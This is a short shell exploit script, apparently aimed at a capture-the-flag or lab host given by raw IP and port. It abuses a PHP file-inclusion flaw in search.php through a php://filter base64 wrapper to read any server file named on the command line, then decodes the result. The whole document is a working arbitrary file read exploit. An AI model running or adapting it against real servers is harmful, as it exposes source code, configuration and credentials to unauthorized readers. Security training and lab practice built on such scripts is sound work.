#!/bin/sh

curl --silent -X $'POST' "http://134.122.112.105:20004/search.php?img=php://filter/convert.base64-encode/resource=${1}" | head -n 1 | sed 's/<br \/>//' | base64 -d